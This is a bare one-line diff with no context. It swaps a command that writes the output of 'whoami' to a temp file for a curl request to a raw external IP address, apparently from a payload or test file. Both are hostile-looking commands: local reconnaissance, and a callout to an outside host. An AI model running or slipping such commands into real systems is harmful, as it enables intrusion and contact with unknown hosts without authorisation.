@@ -1,1 +1,1 @@
-whoami >>/tmp/tmp.txt
+curl https://152.32.164.247:80
